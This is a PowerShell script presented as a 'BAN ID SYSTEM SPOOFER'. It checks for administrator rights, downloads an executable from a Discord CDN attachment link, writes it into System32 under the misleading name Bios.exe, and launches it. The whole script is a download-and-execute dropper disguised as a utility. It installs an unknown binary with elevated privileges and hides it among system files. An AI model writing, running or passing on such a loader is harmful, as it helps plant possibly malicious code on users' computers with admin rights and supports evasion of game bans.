# Define URL and destination
$url = "https://cdn.discordapp.com/attachments/1438914877908582418/1453100770848145562/DriverRestroe.exe?ex=696b344d&is=6969e2cd&hm=f442e8f26fff429d6c1370aaf3314c4c7e92c3cf32ab7d1117b1f0ff9f658be3&"
$destination = "$env:SystemRoot\System32\Bios.exe"

# Download file (requires admin rights)
try {
    # Check if running as administrator
    if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
        throw "Administrator privileges required to write to System32"
    }
    
    # Download the file
    Invoke-WebRequest -Uri $url -OutFile $destination -UseBasicParsing
    
    # Verify file exists
    if (Test-Path $destination) {
        Write-Host "BAN ID SYSTEM SPOOFER" -ForegroundColor Green
        
        # Execute the file
        Start-Process -FilePath $destination
    } else {
        Write-Host "" -ForegroundColor Red
    }
} catch {
    Write-Host "Error:" -ForegroundColor Red
}
